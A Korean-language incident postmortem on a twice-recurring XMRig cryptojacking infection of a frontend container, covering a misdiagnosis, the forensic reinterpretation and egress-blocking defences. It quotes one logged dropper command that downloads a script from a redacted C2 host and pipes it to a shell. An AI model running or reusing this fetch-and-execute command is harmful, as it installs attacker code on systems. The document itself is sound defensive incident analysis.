# 장애 회고 — 프론트엔드 컨테이너 크립토재킹 (2026-06)

2026-06 프론트엔드 컨테이너가 모네로 채굴 멀웨어(XMRig)에 두 차례 감염됐다.

1차 때는 **이미지 공급망 감염**으로 판단하고 거기에 맞춰 대응했다. 며칠 뒤 클린 이미지 + 하드닝
상태에서 재발했고, 2차 조사 과정에서 **1차의 판단이 틀렸다는 게 드러났다.** 실제로는 두 번 모두
런타임 주입이었다. 지금의 방어 구조는 그 뒤집힘에서 나왔다.

포렌식 원자료는 악성코드 설정·해시를 포함하므로 저장소에 커밋하지 않는다(`.gitignore` 처리).

---

## 1차 — 탐지와 초기 판단

### 표면 증상

"메인 배너가 안 뜬다." 코드와 CSS는 정상이었다. 배너 이미지 요청이 **HTTP 400** 을 반환하는 걸 보고
컨테이너 내부를 열었더니, 정상 앱 자산이 사라져 있고 `javae` 로 위장한 채굴 프로세스 수십 개가 CPU 를
점유하고 있었다.

**보안 사고가 UI 버그의 얼굴로 도착했다.**

### 타임라인 (UTC)

| 시각 | 사건 |
|---|---|
| 06-19 13:55 | 컨테이너 시작 |
| 06-19 22:28 | 채굴 바이너리 드롭 (시작 +8.5h) |
| 06-20 | 배너 이상 확인 → 조사 → 탐지·격리 |

### 당시 판단

공개 레지스트리에서 가져다 쓰던 `ott-frontend:latest` **이미지 레이어 자체**에 악성코드가 심겨 있다고
봤다. 저장소 소스 감사는 깨끗했으므로 오염 지점은 퍼블리시된 이미지 쪽이라는 추론이었다. 공급망 공격.

**이 판단은 나중에 뒤집힌다.** (아래 "재해석")

### 대응

- 네트워크부터 차단하고 그다음 정지 — 채굴·유출을 끊으면서 조사할 런타임 상태는 남긴다
- IOC 보존(로그·해시·채굴 지갑)
- 백엔드·PostgreSQL·Redis 감사 → 감염은 프론트엔드 한 곳에 국한됨을 확인
- 의심 이미지 폐기, 무결성 검증한 자체 소스에서 재빌드
- 노출된 자격증명 전량 재발급(DB·OAuth·결제·메일·외부 API·레지스트리·GitHub 토큰) + 2FA

실제 유출 증거는 없었지만 "증거가 없다"와 "유출되지 않았다"는 다르다. 후자를 증명할 수 없으므로
전자만으로 전량 로테이션을 결정했다.

### 1차 하드닝

- 비root 실행(USER 1001), 읽기전용 루트 파일시스템
- `cap_drop: ALL`, `no-new-privileges`, 리소스 상한(mem·cpus)
- 이미지를 `latest` 대신 **digest 로 고정**
- 프론트 포트를 루프백에만 바인딩
- **위 설정을 prod 오버라이드에 내재화** — 사람이 기억해서 붙이는 게 아니라 CD 에서 항상 강제

채굴 프로세스 0개, 배너 200 정상 복구.

## 2차 — 하드닝된 컨테이너에서의 재발

### 이슈

며칠 뒤 **동일한 XMRig 가 재발했다.** 채굴 풀·지갑 주소·파일명까지 1차와 같았다. 이미 클린 이미지로
재빌드했고 자격증명도 전부 교체한 뒤였다. 1차의 결론으로는 설명이 안 되는 상황이었다.

### 원인 규명

원인을 단정하지 않고, **의심 항목을 하나씩 증거로 배제**해 나갔다.

| 의심 | 검증 방법 | 결과 |
|---|---|---|
| 이미지가 또 오염됐나 | 실행 이미지를 검증된 클린 이미지와 **바이트 단위 대조** | `server.js`·`node_modules` 동일, 악성코드 없음 → **이미지 아님** |
| 교체 전 자격증명이 쓰였나 | 배포 기록·파일 타임스탬프로 타임라인 재구성 | 자격증명은 이틀 전 이미 교체됨 |
| 원격 접속 경로인가 | 접근 경로 점검 | 닫혀 있음 |

이미지가 아니라면 **런타임 주입**이다. 깨끗한 컨테이너를 배포한 지 약 3시간 뒤 감염됐고, 정황상 남은
진입로는 **인터넷에 노출된 앱(구버전 Next.js)** 뿐이었다. 다만 익스플로잇 체인은 로그 소실로 끝내
단정하지 못했다.

하드닝은 무력하지 않았다. 읽기전용 루트 파일시스템 때문에 드롭 위치가 `/app/public` 이 아니라 쓰기
가능한 `/tmp` 로 밀려났고, 비root 라 호스트 탈출도 지속성 확보도 없었다. **피해는 줄었지만 침입은
막지 못했다.**

## 재해석 — 1차도 런타임 주입이었다

이미지가 아니라는 게 2차에서 확인되자, 1차 판단도 다시 볼 이유가 생겼다. 보존해둔 1차 포렌식
원자료가 이미 답을 갖고 있었다.

**① 시각이 안 맞는다.** 컨테이너 시작은 13:55:45 인데 `/app/public/` 의 `javae` 와 `config.json` 은
둘 다 22:28 이다. 이미지 레이어에 구워져 있었다면 파일 시각이 빌드 시점이어야 하고 컨테이너 시작
순간부터 존재했어야 한다. **8.5시간 뒤에 생겨났다 = 실행 중에 만들어졌다.**

**② 배너가 8.5시간 동안은 멀쩡했다.** `/app/public/` 에 남은 파일은 그 둘뿐이고 디렉터리 mtime 도
22:28 이다. 이미지가 원래 그 상태였다면 배포 직후부터 배너가 깨졌어야 한다. 배너 400 은 이미지의
상태가 아니라 **런타임에 정적 자산이 지워진 결과**였다.

**③ 앱 프로세스가 드로퍼를 실행한 로그가 남아 있었다.** 컨테이너 stdout 에 Next.js 에러로
`Command failed: wget -q http://<C2>/js/grepb32.txt -O- |sh` 가 찍혔다. 주변에는 `/tmp` 위장
디렉터리를 정리하려다 실패한 busybox 출력이 다수.

**결론: 1·2차는 같은 사고다.** 같은 지갑, 같은 풀, 같은 파일명, 같은 방식. 1차와 2차의 차이는 침입
방식이 아니라 **하드닝 유무**뿐이었다.

| | 1차 | 2차 |
|---|---|---|
| 주입 시점 | 시작 +8.5h | 클린 배포 +3h |
| 실행 권한 | root | 비root(node) |
| 드롭 위치 | `/app/public` (앱 자산 삭제) | `/tmp` (읽기전용 rootfs에 막혀 밀려남) |
| 결과 | 서비스 장애 + 채굴 | 채굴만 |

"이미지가 감염됐다"는 1차 판단은 **원본 증거가 아니라 추론**이었다. 소스가 깨끗하니 이미지겠거니
했고, 이미지를 폐기·재빌드했더니 증상이 사라져서 확증처럼 보였다. 실제로 사라진 이유는 재빌드가
아니라 컨테이너를 새로 띄웠기 때문이었다. **그래서 며칠 뒤 그대로 재발했다.**

## 방향 전환

1차 대응의 전제는 "깨끗한 이미지를 쓰고 컨테이너를 단단히 조인다"였다. 2차는 그 전제 위에서 뚫렸고,
재해석 결과 1차 대응은 애초에 원인을 겨냥한 것도 아니었다.

> 침입을 100% 막는다 → **침입해도 돈이 안 되게 만든다**

크립토재킹은 밖으로 나갈 수 있어야 성립한다. 채굴 풀에 연결하지 못하면 공격자 수익이 0 이고,
드로퍼 다운로드부터 실패한다. 침투 벡터를 몰라도 **침투의 가치를 없애는 방어**는 유효하다.

## 무엇을 바꿨나

**핵심은 egress 차단이다.** 프론트엔드를 인터넷으로 나갈 수 없는 내부망에 격리했다.

| 조건 | 대책 | 위치 |
|---|---|---|
| 아웃바운드 무제한 | 프론트 egress 차단. 인터넷이 실제로 필요한 백엔드만 egress 망에 연결 | `docker-compose.netlock.yml` |
| 권한 확대 | 1차 하드닝 유지(비root·read_only·cap_drop·no-new-privileges·리소스 상한) | prod 오버라이드 |
| 알려진 취약점 | Next.js 보안 패치 버전 업그레이드, 백엔드 노출 포트 루프백 제한 | frontend, compose |
| 재감염 미탐지 | 런타임 워치독으로 자동 탐지·격리 | `security/` |
| 공개 레지스트리 | Docker Hub → 비공개 레지스트리(GHCR) 이전 | CI/CD |
| 배포 이미지 불확정 | 커밋 SHA 태깅 + digest 고정 | CD |
| 취약점 유입 | Trivy 스캔, 패치 있는 CRITICAL 은 빌드 실패 | CI |
| 장기 자격증명 | 단기 토큰으로 전환 | CI/CD |

상세 설계는 `docs/security.md`.

**결과:** 채굴 프로세스 0개, HTTPS 200 복구, **프론트엔드 아웃바운드 차단까지 직접 확인.** 이후 재발 없음.

이후 별도로 진행한 하드닝(데이터 계층 망분리·저장소 인증·PostgreSQL 최소권한 등, 2026-07)은 이 사고의
대응이 아니라 선제 점검이다. 사고 대응 범위와 구분해 `docs/security.md` 에 정리한다.

## 배운 것

- **증상이 사라진 것과 원인이 제거된 것은 다르다.** 1차에서 이걸 구분하지 못해 며칠 뒤 그대로
  재발했다. 재빌드 후 정상 복구를 확인한 게 확증처럼 느껴진 게 함정이었다.
- **추론을 결론으로 적으면 다음 사람이 속는다.** 그 다음 사람이 며칠 뒤의 나였다. 지금은 확정된
  것과 추정인 것을 문서에서 구분해 적는다.
- **하드닝은 피해를 줄일 뿐 예방이 아니다.** 1·2차 비교가 그대로 실측이다. 드롭 위치를 밀어내고
  권한을 뺏었을 뿐 침입은 그대로 성립했다. 예방에는 egress 차단 같은 통제가 필요하다.
- **원인을 다 밝히지 못해도 서비스는 지킬 수 있다.** "무엇이 원인인가"보다 "무엇이 원인이 아닌가"를
  증거로 좁히는 쪽이 실제로 진도가 나갔다.
- **하드닝은 사람의 기억이 아니라 파이프라인에 강제해야 유지된다.**
- **표면 증상과 실제 원인은 전혀 다를 수 있다.** 시작은 배너 400 이었다.
- **증거 보존이 나중에 값을 한다.** 1차 판단을 뒤집을 수 있었던 건 그때 로그와 파일 타임스탬프를
  남겨뒀기 때문이다. 컨테이너를 지웠다면 재해석 자체가 불가능했다.

## 남은 리스크

- 익스플로잇 체인 미규명(로그 소실). 같은 경로가 열려 있을 가능성을 배제할 수 없고, 현재 방어는
  벡터가 아니라 결과를 막는 구조라는 점을 전제로 한다
- 단일 호스트 구성이라 호스트 자체가 침해되면 컨테이너 격리는 무의미하다
- netlock 오버레이가 빠진 채 배포되면 아웃바운드가 다시 열린다. 그래서 배포는 반드시 스크립트를
  경유한다 (`docs/deployment.md`)
